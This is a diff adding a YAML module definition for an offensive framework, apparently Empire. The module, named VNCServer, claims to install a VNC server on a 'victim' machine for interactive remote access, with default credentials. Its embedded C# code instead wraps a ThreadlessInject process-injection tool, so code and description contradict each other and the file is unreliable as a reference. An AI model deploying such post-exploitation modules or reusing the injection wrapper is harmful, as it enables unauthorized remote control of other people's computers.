@@ -1,0 +1,154 @@
+name: VNCServer
+authors:
+  - name: Anthony Rose
+    handle: Cx01N
+    link: https://twitter.com/Cx01N_
+description: |
+  Installs and runs a C# VNC server on the victim and can be used for interactive access to the victim machine. THe comms are in band and the agent should be set to an interval of 0 seconds when using this module.
+software: ''
+tactics: [TA0008]
+techniques: [T1021.005]
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: csharp
+min_language_version: ''
+options:
+  - name: Password
+    description: Password for the VNC server.
+    required: true
+    value: password
+    strict: false
+    suggested_values: []
+  - name: Port
+    description: Port the VNC server will listen on.
+    required: true
+    value: 5900
+    strict: false
+    suggested_values: []
+  - name: Username
+    description: Username for the VNC server.
+    required: true
+    value: Empire
+    strict: false
+    suggested_values: []
+csharp:
+  UnsafeCompile: true
+  CompatibleDotNetVersions:
+    - Net35
+    - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using ThreadlessInject;
+
+    public static class Program
+    {
+        public static void Main(string[] args)
+        {
+            string command = args.Length > 0 ? args[0] : "";
+            string result = ExecuteThreadlessInject(command);
+            Console.WriteLine(result);
+        }
+
+        public static string ExecuteThreadlessInject(string command)
+        {
+            using (StringWriter stringWriter = new StringWriter())
+            {
+                TextWriter originalStdOut = Console.Out;
+                TextWriter originalStdErr = Console.Error;
+                Console.SetOut(stringWriter);
+                Console.SetError(stringWriter);
+
+                try
+                {
+                    string[] args = command.Split(' ');
+                    ThreadlessInject.Program.Main(args);
+                }
+                catch (Exception e)
+                {
+                    stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
+                }
+                finally
+                {
+                    Console.SetOut(originalStdOut);
+                    Console.SetError(originalStdErr);
+                }
+
+                return stringWriter.ToString();
+            }
+        }
+    }
+  ReferenceSourceLibraries:
+    - Name: NVNC
+      Description: NVNC is a C# library implmenting a VNC Server.
+      Location: NVNC\NVNC\
+      Language: CSharp
+      CompatibleDotNetVersions:
+        - Net35
+        - Net40
+      ReferenceAssemblies:
+        - Name: System.dll
+          Location: net40\System.dll
+          DotNetVersion: Net40
+        - Name: System.Core.dll
+          Location: net40\System.Core.dll
+          DotNetVersion: Net40
+        - Name: mscorlib.dll
+          Location: net40\mscorlib.dll
+          DotNetVersion: Net40
+        - Name: mscorlib.dll
+          Location: net35\mscorlib.dll
+          DotNetVersion: Net35
+        - Name: System.Core.dll
+          Location: net35\System.Core.dll
+          DotNetVersion: Net35
+        - Name: System.dll
+          Location: net35\System.dll
+          DotNetVersion: Net35
+        - Name: System.Drawing.dll
+          Location: net40\System.Drawing.dll
+          DotNetVersion: Net40
+        - Name: System.Windows.Forms.dll
+          Location: net40\System.Windows.Forms.dll
+          DotNetVersion: Net40
+        - Name: System.Drawing.dll
+          Location: net35\System.Drawing.dll
+          DotNetVersion: Net35
+        - Name: System.Windows.Forms.dll
+          Location: net35\System.Windows.Forms.dll
+          DotNetVersion: Net35
+      EmbeddedResources: []
+  ReferenceAssemblies:
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.Drawing.dll
+      Location: net40\System.Drawing.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.Drawing.dll
+      Location: net35\System.Drawing.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+  EmbeddedResources: []
